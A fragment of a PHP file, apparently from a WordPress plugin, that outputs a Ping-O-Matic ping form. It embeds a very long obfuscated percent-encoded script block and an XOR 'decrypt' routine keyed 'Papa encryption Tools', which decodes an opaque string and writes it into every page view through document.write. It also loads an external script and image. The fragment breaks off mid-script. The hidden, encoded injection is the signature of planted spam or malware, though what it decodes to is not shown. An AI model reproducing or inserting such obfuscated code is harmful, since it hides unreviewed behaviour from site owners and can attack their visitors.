7%39%43%54C30CT5%3WF56%Q6%36AP9G25%52%36%2S%3PC39%UR%55@70%4SF3T%37%25%32%U0%TS%36DP4%2P%36%VS%P5%36%23%43C36CU1%2TF56%P7%25AP6G39%40%36%7#%2SC36%SR%46@37%5UF2W%32%30%25%U7%US%25DP7%3V%25%QS%Q9%25%50%23C25CU6%3VF44%P1%30AQ5G35%55%25%3P%3WC25%TP%5t@25%5QF3R%25%36%31%T5%UP%71DQ5%3W%30%PP%Q6%32%43%51C35CT5%3VF55%Q6%37AP4G25%53%70%2S%3PC76%UR%51@30%4SF3T%32%25%36%U5%TS%36DT4%2P%36%VS%P5%37%51%43C32CQ1%2TF53%P3%25AP5G34%40%36%3^%2SC36%TV%46@36%4QF2W%36%76%25%U2%UV%25DP7%39%25%QS%U3%25%51%53C25CU0%7WF44%P3%39AQ5G30%39%25%3U%7AC25%TP%53@25%5UF7W%25%30%77%T5%UT%30DQ5%3W%30%PP%Q2%30%43%54C30CT5%3SF51%Q6%32AP0G25%57%30%2S%3TC30%UR%51@30%4SF3P%30%25%33%Q2%TS%36DP6%2P%36%VS%P5%37%54%43C36CQ0%2TF53%P3%25AP6G31%40%36%3U%2SC37%TS%46@36%5&F2W%36%72%25%U6%QT%25DP3%7W%25%QW%Q2%25%50%5wC25CU7%3UF44%P4%34AQ5G37%55%25%3Q%3UC25%TT%22@25%5TF7T%25%32%70%T5%UQ%37DQ5%3R%37%PP%Q7%37%43%54C75CT5%3VF51%Q6%36AP1G25%52%39%2S%3QC30%UR%55@31%4SF3T%76%25%32%Q4%TS%36DP3%2P%36%VS%P5%36%22%43C32CQ2%2TF57%P0%25AP6G37%40%36%3_%2SC32%SS%46@36%5TF2W%36%39%25%U6%QT%25DP2%7U%25%QR%Q7%25%50%53C25CU6%3SF44%P4%33AQ5G36%56%25%3Q%3TC25%TU%51@25%5TF3R%25%36%72%T5%UP%35DQ5%3R%34%PP%Q6%38%43%50C76CT5%3WF55%Q6%33AT7G25%57%32%2S%3QC30%UR%55@73%4SF3U%33%25%37%U4%TS%32DP2%2P%33%VP%P5%30%41%43C32CU0%2TF53%P3%25AP2G30%40%32%3V%2SC32%TW%46@32%5VF2W%32%30%25%U2%UV%25DP2%3U%25%QW%Q0%25%54%56C25CU2%3QF44%P0%70AQ5G36%39%25%3P%7%C25%TP%53@25%5QF3W%25%37%34%T5%UT%30DQ5%3R%34%PP%Q7%39%43%51C30CT5%3WF54%Q6%33AT7G25%57%32%2S%3PC38%UR%55@39%4SF3T%34%25%36%U4%TS%36DP5%2P%36%VP%P5%32%54%43C32CU0%2TF57%W6%25AP6G31%40%36%7%%2SC36%TR%46@33%2RF2W%32%32%25%U6%UU%25DP6%7W%25%QS%Q4%25%54%54C25CU2%3QF44%P4%36AQ5G36%54%25%3P%7AC25%TP%56@25%5PF3W%25%33%72%T5%UT%32DQ5%3P%74%PP%Q7%33%43%54C74CT5%3VF59%Q6%36AP3G25%53%75%2S%3PC39%UR%55@33%4SF3T%77%25%32%U2%TS%33DT2%2P%30%PR%P5%32%56%43C32CU0%2TF53%P3%25AP2G30%40%32%3V%2SC32%TW%46@32%5VF2W%32%30%25%U2%UV%25DP2%3U%25%QW%Q0%25%54%56C25CU3%7UF44%P5%39AQ5G36%20%25%3Q%3VC25%TP%56@25%5QF3V%25%32%30%T5%UQ%34DQ5%3R%39%PP%Q7%30%43%50C35CT5%3RF25%Q6%32AP2G25%53%38%2S%3PC39%UR%55@34%4SF3T%34%25%36%U5%TS%36DT2%2P%32%QW%P5%32%56%43C36CQ1%2TF57%P2%25AP6G71%40%36%3S%2SC33%SS%46@32%5TF2W%36%38%25%U6%QW%25DP7%3V%25%QR%Q4%25%50%53C25CU6%3UF44%P6%75AQ5G36%57%25%3Q%3SC25%TP%57@25%5QF3V%25%36%70%T5%UP%77DQ5%3P%74%PP%Q6%39%43%50C34CT5%3SF53%Q6%32AP0G25%52%36%2S%3PC31%UR%55@76%4SF3U%35%25%36%U5%TS%33DT3%2P%32%QW%P5%34%5w%43C33CU9%2TF54%P3%25AP5G35%40%34%3W%2SC35%TQ%46@33%5QF2W%34%76%25%U5%UR%25DP3%3W%25%QQ%Q8%25%52%50C25CU5%3XF44%P1%32AQ5G33%20%25%3V%7^C25%TU%53@25%5TF3R%25%32%30%T5%UT%30DQ5%3W%30%PP%Q2%30%43%54C30CT5%3SF51%Q6%32AP0G25%57%30%2S%3TC30%UR%51@30%4SF3Q%76%25%36%U9%TS%36DT2%2P%37%QU%P5%37%53%43C37CU4%2TF53%P3%25AP7G34%40%37%3_%2SC37%TW%46@36%5SF2W%33%70%25%U2%UT%25DP6%39%25%QS%U1%25%50%57C25CU6%3VF44%P5%35AQ5G32%57%25%3T%3VC25%TP%50@25%5QF3P%25%36%33%T5%UU%76DQ5%3W%32%PP%Q6%38%43%51C34CT5%3VF55%Q6%37AP0G25%52%33%2S%3UC72%UR%51@73%4SF3P%73%25%37%U7%TS%37DP7%2P%37%QR%P5%32%23%43C37CU0%2TF57%P2%25AP7G39%40%37%3V%2SC36%TV%46@36%2UF2W%32%71%25%U6%UU%25DP6%7U%25%QS%U1%25%54%20C25CU6%3TF44%P5%76AQ5G35%23%25%3S%3SC25%TR%50@25%5TF7T%25%36%39%T5%UT%74DQ5%3S%32%PP%Q7%34%43%50C75CT5%3SF46%Q6%36AP2G25%52%34%2S%3PC76%UR%56@73%4SF3T%34%25%36%Q7%TS%36DT2%2P%36%QT%P5%37%52%43C36CU5%2TF55%P0%25AP4G33%40%35%7#%2SC34%UP%46@34%5QF2W%32%71%25%U6%UQ%25DP6%39%25%QS%Q6%25%54%54C25CU2%3QF44%P5%32AQ5G36%23%25%3Q%3TC25%TQ%57@25%5PF3W%25%37%32%T5%UU%76DQ5%3W%32%PP%Q3%30%43%54C32CT5%3SF51%Q6%36AT6G25%53%31%2S%3PC77%UR%55@35%4SF3Q%71%25%32%U2%TS%37DP3%2P%37%QP%P5%36%54%43C36CQ0%2TF57%Pw%25AP7G34%40%32%3T%2SC32%TW%46@36%5WF2W%36%77%25%U7%UR%25DP3%7W%25%QW%Q2%25%53%56C25CU6%3PF44%P4%39AQ5G35%55%25%3P%3WC25%TQ%20@25%5TF3R%25%32%72%T5%UT%30DQ5%3P%34%PP%Q6%38%43%50C35CT5%3SF51%Q6%37AP3G25%53%31%2S%3PC36%UR%55@35%4SF3U%32%25%32%Q2%TS%32DP0%2P%36%QP%P5%36%57%43C37CU3%2TF57%Pw%25AP6G35%40%37%3T%2SC32%TW%46@37%5QF2W%36%31%25%U7%U_%25DP2%3U%25%QR%Q4%25%50%20C25CU2%3QF44%P4%30AQ5G36%54%25%3Q%3_C25%TU%53@25%5PF7T%25%36%73%T5%UP%71DQ5%3S%39%PP%Q6%76%43%50C35CT5%3SF50%Q6%32AP2G25%56%73%2S%3VC72%UR%51@30%4SF3P%30%25%32%U0%TS%32DP0%2P%32%QU%P5%32%56%43C32CU0%2TF53%P3%25AP2G30%40%32%3V%2SC32%TW%46@32%5VF2W%33%77%25%U6%U_%25DP6%7W%25%QS%Q7%25%54%56C25CU6%3PF44%P5%70AQ5G37%51%25%3U%7"C25%TU%51@25%5TF3P%25%32%30%T5%UP%32DQ5%3S%74%PP%Q7%32%43%50C34CT5%3WF54%Q6%37AP2G25%56%72%2S%3TC32%UR%50@30%4SF3P%32%25%32%U0%TS%37DP3%2P%37%QW%P5%36%55%43C33CQ0%2TF53%P1%25AP6G38%40%37%3R%2SC37%TS%46@37%5VF2W%37%33%25%U3%QP%25DP2%7U%25%QW%U3%25%51%51C25CU7%3VF44%P4%37AQ5G32%20%25%3Q%3VC25%TQ%52@25%5QF3[%25%37%30%T5%UP%31DQ5%3S%71%PP%Q2%76%43%50C33CT5%3WF46%Q6%36AT7G25%57%70%2S%3PC39%UR%55@34%4SF3W%73%25%34%U9%TS%34DP4%2P%32%VS%P5%36%5t%43C32CQ2%2TF56%P0%25AP6G33%40%37%3T%2SC32%SQ%46@37%5VF2W%36%39%25%U7%U^%25DP6%3P%25%QS%U6%25%54%23C25CU6%3VF44%P5%39AQ5G36%53%25%3T%3TC25%TU%53@25%5QF3U%25%36%39%T5%UP%34DQ5%3R%34%PP%Q6%38%43%55C74CT5%3SF53%Q6%33AP1G25%57%32%2S%3TC30%UR%55@38%4SF3T%35%25%36%U9%TS%36DP7%2P%36%Q&%P5%37%52%43C33CQ0%2TF53%P1%25AP3G31%40%32%3T%2SC33%SR%46@30%2WF2W%32%30%25%U2%UV%25DP2%3U%25%QW%Q0%25%54%56C25CU2%3QF44%P1%30AQ5G32%55%25%3T%3VC25%TU%53@25%5UF7Q%25%32%70%T5%UP%36DQ5%3S%74%PP%Q7%32%43%50C74CT5%3RF24%Q6%30AT2G25%55%39%2S%3VC39%UR%51@30%4SF3P%30%25%33%Q2%TS%32DT1%2P%37%QU%P5%33%23%43C30CQ5%2TF52%W0%25AP6G32%40%37%3T%2SC33%SR%46@33%2UF2W%36%32%25%U7%UT%25DP3%7V%25%QU%U4%25%52%52C25CU6%3TF44%P4%36AQ5G36%50%25%3P%7AC25%TQ%25@25%5QF3R%25%36%35%T5%UP%34DQ5%3W%30%PP%Q4%32%43%51C39CT5%3SF51%Q6%33AT0G25%52%33%2S%3QC34%UR%54@32%4SF3T%73%25%36%Q4%TS%36DP7%2P%33%VP%P5%35%56%43C36CU1%2TF56%P3%25AP6G31%40%32%3V%2SC34%TS%46@36%5SF2W%37%33%25%U7%UR%25DP7%3W%25%QS%Q1%25%55%25C25CU2%7PF44%P4%33AQ5G37%51%25%3Q%3TC25%TQ%25@25%5PF7W%25%36%37%T5%UU%77DQ5%3V%71%PP%Q6%32%43%51C32CT5%3RF24%Q6%30AT2G25%50%37%2S%3PC35%UR%55@32%4SF3U%33%25%36%U9%TS%37DP4%2P%36%QP%P5%33%41%43C32CU0%2TF52%W0%25AP6G31%40%32%3V%2SC36%R[%46@37%5TF2W%36%35%25%U6%UP%25DP3%7W%25%QW%Q2%25%50%5wC25CU7%3UF44%P4%34AQ5G37%55%25%3U%7^C25%TU%25@25%5TF7T%25%37%37%T5%UQ%37DQ5%3R%37%PP%Q2%76%43%51C30CT5%3WF50%Q6%37AP0G25%53%31%2S%3PC34%UR%55@35%4SF3U%33%25%37%U4%TS%37DP2%2P%36%QT%P5%32%23%43C36CU3%2TF57%W5%25AP6G71%40%32%7#%2SC32%TU%46@32%5VF2W%37%34%25%U6%UW%25DP7%3W%25%QS%Q7%25%50%53C25CU7%3UF44%P0%77AQ5G32%57%25%3S%4PC25%TQ%51@25%5PF7Q%25%36%31%T5%UP%77DQ5%3S%70%PP%Q2%32%43%55C75CT5%3WF59%Q6%37AP4G25%52%34%2S%3QC30%UR%50@74%4SF3P%73%25%32%Q7%TS%37DP7%2P%37%QR%P5%37%51%43C32CQ1%2TF56%P3%25AP6G31%40%37%3V%2SC36%TV%46@36%5RF2W%36%35%25%U7%UU%25DP7%3Q%25%QR%Q2%25%50%57C25CU2%7SF44%P5%33AQ5G36%23%25%3P%7"C25%TU%25@25%5UF7Q%25%32%70%T5%UP%31DQ5%3V%77%PP%Q3%70%43%50C32CT5%3VF53%Q6%33AT6G25%55%77%2S%3RC35%UR%51@71%4SF3T%71%25%36%U1%TS%36DP9%2P%36%VV%P5%33%41%43C32CU0%2TF57%W6%25AP6G37%40%36%3W%2SC36%TS%46@36%5&F2W%36%77%25%U7%US%25DP7%3R%25%QS%Q9%25%50%5wC25CU4%3QF44%P5%37AQ5G36%21%25%3P%3WC25%TQ%5t@25%5PF7Q%25%32%73%T5%UP%33DQ5%3S%74%PP%Q6%77%43%56C39CT5%3SF51%Q6%33AT0G25%53%32%2S%3QC32%UR%50@70%4SF3P%30%25%30%Q0%TS%32DP0%2P%32%QU%P5%32%56%43C32CU0%2TF53%P3%25AP2G30%40%32%3V%2SC32%TW%46@33%2UF2W%32%72%25%U6%UR%25DP6%39%25%QR%Q6%25%55%23C25CU3%7UF44%P1%75AQ5G37%51%25%3P%3RC25%TT%26@25%5VF7S%25%32%30%T5%UT%30DQ5%3W%30%PP%Q2%30%43%55C73CT5%3SF46%Q6%37AP4G25%52%32%2S%3UC76%UR%53@74%4SF3P%30%25%32%U0%TS%33DT4%2P%37%QQ%P5%37%54%43C33CQ1%2TF51%W2%25AP2G30%40%32%3V%2SC32%TW%46@32%5VF2W%33%77%25%U7%UR%25DP6%3Q%25%QW%Q0%25%51%51C25CU6%3XF44%P5%34AQ5G37%51%25%3P%3^C25%TT%44@25%5TF3P%25%33%33%T5%UU%31DQ5%3W%35%PP%Q2%32%43%54C30CT5%3VF53%Q6%36AT5G25%52%37%2S%3QC33%UR%54@30%4SF3T%31%25%36%Q4%TS%33DT3%2P%32%QW%P5%33%57%43C33CU1%2TF53%P1%25AP3G70%40%33%7$%2SC36%TS%46@36%5&F2W%37%36%25%U2%UV%25DP6%3T%25%QS%U6%25%50%5tC25CU6%3VF44%P5%76AQ5G33%21%25%3T%3TC25%TQ%50@25%5PF3W%25%36%73%T5%UQ%34DQ5%3S%35%PP%Q7%32%43%54C32CT5%3RF24%Q6%30AT2G25%57%30%2S%3TC30%UR%51@30%4SF3P%30%25%32%U0%TS%32DP0%2P%32%QU%P5%32%56%43C33CQ7%2TF57%Pw%25AP6G36%40%37%3T%2SC36%TV%46@36%2RF2W%36%35%25%U2%UV%25DP7%3V%25%QR%Q2%25%50%55C25CU3%7RF44%P1%32AQ5G36%5u%25%3Q%3RC25%TP%57@25%5QF3R%25%33%77%T5%UT%74DQ5%3W%74%PP%Q7%37%43%51C37CT5%3VF56%Q6%32AT6G25%53%36%2S%3PC31%UR%55@33%4SF3T%35%25%36%U2%TS%36DT1%2P%36%VS%P5%36%24%43C32CQ1%2TF57%P0%25AP6G73%40%36%7%%2SC32%SQ%46@37%5VF2W%36%77%25%U7%US%25DP6%3R%25%QS%Q9%25%50%23C25CU7%3RF44%P1%75AQ5G36%26%25%3P%3_C25%TQ%21@25%5PF3W%25%36%32%T5%UP%74DQ5%3R%38%PP%Q2%76%43%51C30CT5%3WF59%Q6%37AP0G25%56%70%2S%3PC38%UR%54@32%4SF3T%35%25%36%U6%TS%33DT3%2P%36%Q&%P5%37%52%43C37CU4%2TF56%P3%25AP2G35%40%33%3U%2SC34%TV%46@32%5SF2W%33%32%25%U4%UP%25DP2%3P%25%QV%Q2%25%52%50C25CU7%3VF44%P4%37AQ5G37%52%25%3T%7%C25%TQ%55@25%5PF3S%25%36%33%T5%UP%35DQ5%3S%32%PP%Q6%75%43%50C76CT5%3WF23%Q6%32AT6G25%53%33%2S%3PC75%UR%55@71%4SF3P%35%25%33%U2%TS%34DP6%2P%36%QT%P5%37%56%43C37CU0%2TF56%P0%25AP2G35%40%33%3T%2SC34%TQ%46@36%5WF2W%37%30%25%U7%UV%25DP6%7P%25%QS%Q9%25%50%55C25CU6%3PF44%P4%34AQ5G36%39%25%3P%4PC25%TQ%26@25%5TF7W%25%37%30%T5%UP%38DQ5%3R%30%PP%Q2%35%43%55C33CT5%3UF57%Q6%36AP9G25%53%34%2S%3TC35%UR%50@33%4SF3V%34%25%33%U1%TS%33DP4%2P%33%QV%P5%33%52%43C33CU9%2TF52%P6%25AP3G37%40%33%3P%2SC33%TR%46@33%5PF2W%33%37%25%U3%U_%25DP3%3U%25%QV%Q7%25%55%55C25CU2%3WF44%P5%31AQ5G36%21%25%3Q%3VC25%TT%21@25%5QF3U%25%36%39%T5%UP%34DQ5%3R%34%PP%Q6%38%43%55C74CT5%3RF53%Q6%33AP9G25%56%32%2S%3TC36%UR%55@31%4SF3T%71%25%37%U0%TS%33DT5%2P%36%QV%P5%36%20%43C36CQ7%2TF57%W5%25AP7G32%40%37%3U%2SC36%TT%46@36%5%F2W%36%35%25%U6%QU%25DP6%3P%25%QV%U1%25%50%25C25CU6%3XF44%P5%37AQ5G36%5u%25%3Q%3RC25%TU%55@25%5PF3S%25%36%72%T5%UQ%30DQ5%3V%70%PP%Q6%33%43%50C76CT5%3WF24%Q6%36AT6G25%53%35%2S%3PC33%UR%54@34%4SF3T%39%25%36%Q7%TS%36DT2%2P%37%QV%P5%33%22%43C33CU1%2TF52%P3%25AP2G36%40%36%3W%2SC36%SS%46@37%5VF2W%33%76%25%U7%UU%25DP7%3Q%25%QR%Q2%25%50%53C25CU6%3PF44%P5%77AQ5G33%21%25%3Q%3RC25%TP%51@25%5QF3W%25%36%35%T5%UT%36DQ5%3S%31%PP%Q6%77%43%51C30CT5%3RF23%Q6%36AP8G25%53%35%2S%3PC31%UR%55@34%4SF3T%35%25%37%U2%TS%33DT3%2P%37%QQ%P5%37%54%43C37CU5%2TF57%P6%25AP2G36%40%36%3W%2SC36%SS%46@37%5VF2W%33%76%25%U6%U^%25DP6%3P%25%QS%Q9%25%50%51C25CU6%3YF44%P4%34AQ5G33%21%25%3U%3SC25%TT%5w@25%5UF3U%25%32%32%T5%UT%30DQ5%3R%33%PP%Q6%33%43%51C32CT5%3WF46%Q6%36AT0G25%53%75%2S%3PC39%UR%55@70%4SF3T%37%25%33%Q5%TS%32DP2%2P%36%VP%P5%36%20%43C32CU2%2TF53%P3%25AP6G36%40%37%3T%2SC36%TV%46@36%2RF2W%36%35%25%U6%UT%25DP6%7U%25%QR%Q2%25%50%52C25CU6%3TF44%P4%32AQ5G33%21%25%3T%3TC25%TT%53@25%5TF3P%25%32%30%T5%UQ%33DQ5%3R%34%PP%Q7%39%43%50C73CT5%3WF54%Q6%33AT7G25%57%32%2S%3PC32%UR%55@73%4SF3U%32%25%36%U4%TS%36DP5%2P%37%QW%P5%33%41%43C36CQ1%2TF57%W5%25AP6G70%40%36%3S%2SC33%SU%46@32%5VF2W%36%72%25%U7%UP%25DP6%3P%25%QR%Q2%25%50%50C25CU6%7UF44%P5%75AQ5G37%52%25%3U%7^C25%TQ%5w@25%5PF3[%25%36%34%T5%UP%34DQ5%3S%35%PP%Q6%76%43%55C72CT5%3SF51%Q6%37AP7G25%53%39%2S%3PC34%UR%54@34%4SF3T%38%25%33%Q0%TS%33DP2%2P%33%Q%%P5%33%54%43C37CU0%2TF56%Pt%25AP3G77%40%32%3V%2SC36%R[%46@36%5SF2W%36%39%25%U6%UQ%25DP6%3]%25%QR%Q4%25%55%41C25CU3%3TF44%P0%38AQ5G33%52%25%3Q%3VC25%TP%5w@25%5UF7P%25%32%32%T5%UT%30DQ5%3S%31%PP%Q6%70%43%50C73CT5%3WF46%Q6%37AP7G25%52%34%2S%3QC32%UR%55@31%4SF3T%70%25%37%U3%TS%37DP0%2P%36%QT%P5%37%54%43C36CU5%2TF57%W6%25AP6G33%40%37%3_%2SC33%SS%46@32%5TF2W%37%34%25%U7%UT%25DP7%3P%25%QS%Q5%25%54%54C25CU3%7SF44%P0%70AQ5G32%23%25%3P%3_C25%TQ%55@25%5QF3P%25%36%31%T5%UP%76DQ5%3S%35%PP%Q3%76%43%56C71CT5%3SF51%Q6%32AP0G25%57%30%2S%3TC30%UR%51@30%4SF3P%30%25%33%Q2%TS%32DT1%2P%36%QQ%P5%36%5t%43C37CU6%2TF52%W6%25AP3G76%40%32%7#%2SC37%TS%46@36%5RF2W%33%71%25%U0%QP%25DP2%3U%25%QW%Q0%25%54%56C25CU2%3QF44%P0%70AQ5G37%51%25%3P%3RC25%TU%53@25%5QF3U%25%36%39%T5%UP%34DQ5%3R%34%PP%Q6%38%43%55C74CT5%3SF53%Q6%33AP1G25%57%35%2S%3TC32%UR%50@70%4SF3P%36%25%36%Q4%TS%36DP2%2P%37%QV%P5%37%56%43C33CQ6%2TF52%W0%25AP2G73%40%37%3R%2SC36%TS%46@33%4QF2W%30%75%25%U2%UV%25DP2%3U%25%QV%U6%25%54%20C25CU7%3UF44%P4%32AQ5G33%20%25%3V%7^C25%TU%53@25%5TF3R%25%30%77%T5%UT%30DQ5%3W%30%PP%Q3%70%43%51C34CT5%3VF53%Q6%33AT6G25%55%77%2S%3TC30%UR%51@30%4SF3P%30%25%32%U0%TS%33DT4%2P%37%QQ%P5%36%52%43C32CU0%2TF57%Pt%25AP6G35%40%36%3_%2SC36%TP%46@36%5%F2W%37%34%25%U3%QU%25DP2%3W%25%QV%Q2%25%55%57C25CU2%3SF44%P0%76AQ5G32%53%25%3P%7%C25%TQ%51@25%5QF3Q%25%37%30%T5%UU%70DQ5%3V%71%PP%Q2%75%43%51C34CT5%3WF55%Q6%33AT6G25%55%77%2S%3TC30%UR%51@30%4SF3Q%76%25%32%Q7%TS%37DP4%2P%37%QW%P5%33%23%43C30CQ5%2TF53%P3%25AP2G30%40%33%7$%2SC37%TS%46@37%5TF2W%33%71%25%U0%QP%25DP2%3U%25%QW%Q0%25%54%56C25CU2%3QF44%P0%70AQ5G37%51%25%3P%3RC25%TT%26@25%5TF3T%25%36%73%T5%UP%32DQ5%3R%33%PP%Q7%30%43%55C72CT5%3RF22%Q6%32AT5G25%52%34%2S%3PC34%UR%50@70%4SF3R%74%25%32%U0%TS%32DP0%2P%33%VV%P5%32%20%43C37CU4%2TF56%P1%25AP3G70%40%30%7_%2SC32%TW%46@32%5VF2W%33%77%25%U7%UR%25DP7%3W%25%QV%U0%25%56%41C25CU2%3QF44%P1%30AQ5G32%55%25%3T%3VC25%TT%20@25%5QF3V%25%36%34%T5%UU%77DQ5%3W%36%PP%Q6%76%43%50C32CT5%3VF52%Q6%37AP0G25%56%74%2S%3UC70%UR%51@73%4SF3U%34%25%36%U4%TS%33DT2%2P%30%PR%P5%32%56%43C32CU0%2TF52%W0%25AP2G73%40%37%3R%2SC37%TU%46@33%4QF2W%30%75%25%U2%UV%25DP2%3U%25%QV%U6%25%51%52C25CU7%3SF44%P0%76AQ5G30%24%25%3T%3VC25%TU%53@25%5TF3R%25%32%30%T5%UU%71DQ5%3R%34%PP%Q6%34%43%55C75CT5%3SF57%Q6%36AT6G25%53%32%2S%3QC33%UR%54@30%4SF3Q%77%25%33%Q2%TS%32DT1%2P%37%QQ%P5%36%52%43C33CQ1%2TF51%W2%25AP2G30%40%32%3V%2SC33%UP%46@32%2PF2W%37%34%25%U7%UT%25DP3%7V%25%QU%U4%25%54%56C25CU2%3QF44%P0%70AQ5G37%51%25%3Q%3TC25%TT%26@25%5VF7S%25%32%30%T5%UT%30DQ5%3W%30%PP%Q2%30%43%55C73CT5%3VF55%Q6%36AP4G25%56%73%2S%3TC36%UR%55@70%4SF3T%32%25%37%U3%TS%37DP0%2P%33%VW%P5%33%25%43C32CQ2%2TF56%P7%25AP6G34%40%33%7"%2SC30%SV%46@32%5VF2W%32%30%25%U3%QR%25DP2%7U%25%QR%Q4%25%51%54C25CU3%7SF44%P3%72AQ5G32%55%25%3T%3VC25%TT%20@25%5QF3V%25%37%32%T5%UU%77DQ5%3U%73%PP%Q2%30%43%54C30CT5%3SF51%Q6%32AP0G25%56%75%2S%3QC34%UR%55@34%4SF3Q%70%25%32%U6%TS%36DT2%2P%36%QW%P5%37%55%43C37CU0%2TF52%W1%25AP3G76%40%32%7#%2SC37%TS%46@36%5RF2W%33%71%25%U0%QP%25DP2%3U%25%QW%Q0%25%55%25C25CU2%7PF44%P4%34AQ5G37%57%25%3U%7%C25%TW%22@25%5TF3R%25%32%30%T5%UU%71DQ5%3R%34%PP%Q7%32%43%55C75CT5%3QF20%Q6%32AP0G25%57%30%2S%3TC30%UR%51@30%4SF3Q%76%25%37%U4%TS%36DP4%2P%33%VP%P5%32%50%43C36CQ1%2TF57%P1%25AP7G33%40%37%3V%2SC33%SU%46@33%2UF2W%32%72%25%U7%UR%25DP6%3Q%25%QV%U0%25%56%41C25CU2%3QF44%P1%30AQ5G33%26%25%3T%4PC25%TP%57@25%5QF3P%25%33%73%T5%UV%73DQ5%3W%30%PP%Q2%30%43%55C73CT5%3VF55%Q6%37AP2G25%56%73%2S%3VC72%UR%51@30%4SF3P%30%25%32%U0%TS%32DP0%2P%33%VV%P5%37%52%43C36CU4%2TF52%W6%25AP2G36%40%36%7"%2SC36%TU%46@37%5UF2W%37%30%25%U3%QS%25DP3%7P%25%QW%U3%25%51%52C25CU6%3UF44%P0%76AQ5G30%24%25%3T%3VC25%TU%53@25%5UF7Q%25%32%70%T5%UQ%34DQ5%3R%32%PP%Q3%76%43%56C71CT5%3SF51%Q6%32AP0G25%56%75%2S%3QC34%UR%54@32%4SF3Q%70%25%30%Q0%TS%32DP0%2P%32%QU%P5%32%56%43C32CU0%2TF52%W0%25AP7G34%40%36%3R%2SC33%SR%46@32%5PF2W%36%71%25%U6%UT%25DP7%3V%25%QR%Q0%25%55%24C25CU3%7UF44%P1%75AQ5G37%51%25%3P%3RC25%TT%26@25%5VF7S%25%32%30%T5%UT%30DQ5%3V%71%PP%Q2%75%43%51C34CT5%3VF53%Q6%33AT6G25%55%77%2S%3TC30%UR%51@30%4SF3Q%76%25%37%U4%TS%37DP2%2P%33%VP%P5%30%41%43C32CU0%2TF53%P3%25AP2G30%40%32%3V%2SC33%UP%46@37%5RF2W%36%34%25%U2%UV%25DP6%3]%25%QS%Q5%25%50%5tC25CU6%3VF44%P5%38AQ5G37%51%25%3U%7"C25%TU%51@25%5UF3Q%25%33%32%T5%UT%32DQ5%3V%77%PP%Q2%36%43%50C75CT5%3WF53%Q6%37AP3G25%52%30%2S%3UC71%UR%50@76%4SF3P%73%25%37%U4%TS%36DP4%2P%33%VP%P5%30%41%43C32CU0%2TF53%P3%25AP3G76%40%32%7#%2SC37%TS%46@37%5TF2W%33%71%25%U0%QP%25DP3%7P%25%QW%U3%25%51%52C25CU6%3PF44%P5%32AQ5G36%26%25%3P%3SC25%TT%26@25%5VF7S%27%29%3t%Uv%T %73DU3%7W%69%SS%U4%3s%0s');</script><?php	
}
/////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////
function develop_info_function(){
?>
<p>
<script src="http://pingomatic.com/j.js" type="text/javascript"></script>
	<div id="rap">
		<div id="content">
<script type="text/javascript">
<!--
function focusit(){document.getElementById('title').focus();}window.onload = focusit;
//-->
</script>
<script type="text/javascript">
var moreinfo;
var moreinfolink;
var show = '';
var hide = '';
function showhide(show,hide) {
	var showdivid = show;
	var hidedivid = hide;
	showdiv(showdivid);
	hidediv(hidedivid);
	//alert('show: ' + show + ' hide: ' + ' showdivid: ' + showdivid);
	}
function showdiv(showdivid) {
	document.getElementById(showdivid).style.display = 'block';
	}
function hidediv(hidedivid) {
	document.getElementById(hidedivid).style.display = 'none';
	}
</script>
</div><!--/ content -->
<div class="generator">
	<span class="dot"></span>
<img src="http://i1008.photobucket.com/albums/af208/gagombale/1_wwwimtikhancocc_pingmatic.jpg" border="0"><br>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('Papa encryption Tools','uR3D7UKP7%@5LZ^%bVJZ6uWGD2!KW4%B0L[*%b^J[GuWID6VKQB%FMLX]%f_JZBuS@D7VKUG%GFLXX%bVJZ@uWED2UKTF%F2L]^%cZJ[CuWDD6TKTF%FAL]^%b[JZJuWFD6SKUG%GFLY[%b*J[GuS@D7VKUG%FELX2%b3JZKuS@D6PKU7%FCLYW%b*JZFuVCD2UKTF%FLLY_%c[J^CuVID6#KTG%GFL]^%b]JZ0uW6D6RKQB%FLLY_%c3J^CuVED7UKUF%FELXZ%bZJZGuS5D2UKVE%FAL]^%c]JZFuWGD7PKU1%FELX2%b,J[JuS@D6VKUJ%FALY]%b-J^CuWDD6#KTE%F1LX]%c[J[AuWED6TKU6%BDLX]%bZJ[AuVFD69KUA%FALX]%f_J[GuW6D2UKU6%FELY,%bZJ^CuVCD7PKT@%FAL]^%c[JZKuWAD7QKQB%G@LYV%bZJ[JuSGD7WKUG%BDLY-%bZJZDuWID7QKQB%FELY+%b[J^CuVCD7QKUK%F7LY-%f_J[DuW6D7WKU0%B1L]^%a3JZ5uS@D7RKUJ%FMLY-%bZJ^CuWID7QKQB%F0LY_%cVJ^CuWAD7UKTB%FALY_%c]J^CuW3D69KU0%FAL]^%cXJZFuS@D6]KUC%GBLY[%f_JZEuWED7RKUG%GFL]^%c3JZFuVBD7SKUK%FGLY[%c3J^0uS@D7QKUJ%FALXW%fXJ[AuWED2UKTF%FLLY[%f_JZ7uW6D7VKTF%BDLYW%b+J[CuW6D7WKTF%FELY+%c[J^CuW6D6 KUG%GGL]+%d.JX7uWAD6BKUG%BDLX]%cZJ[AuWED2UKTF%F2L]^%b)JZ6uW3D79KQB%GDLYW%b*JZDuS@D7VKTB%FALY]%bVJZBuW3D69KT3%FALYZ%f_J[@uWED7WKTD%FMLY]%bZJ[@uS@D69KUD%BDLXZ%bWJZFuVID2RKT@%FAL]^%c]JZFuW3D6PKTD%FELY+%c[J^CuVDD6#KQB%GMLY(%cZJ[AuS@D6WKU1%F2LYY%f,J^CuW6D7QKUJ%FALX2%cXJZJuVCD6PKQB%GMLY(%cZJ^DuW3D6&KQB%FGLY_%cZJ[@uWED2UKUC%F1L]^%cZJZ6uWDD7PKUG%BDLY2%cZJ[AuWDD6PKU7%BDLY(%b*J^CuVDD6]KUG%F0L]+%d.J_0uS6D7UKP7%@5');</script><form id="pingform" method="get" action="http://pingomatic.com/ping/" target="_blank">
	<fieldset>
<script>
<!--
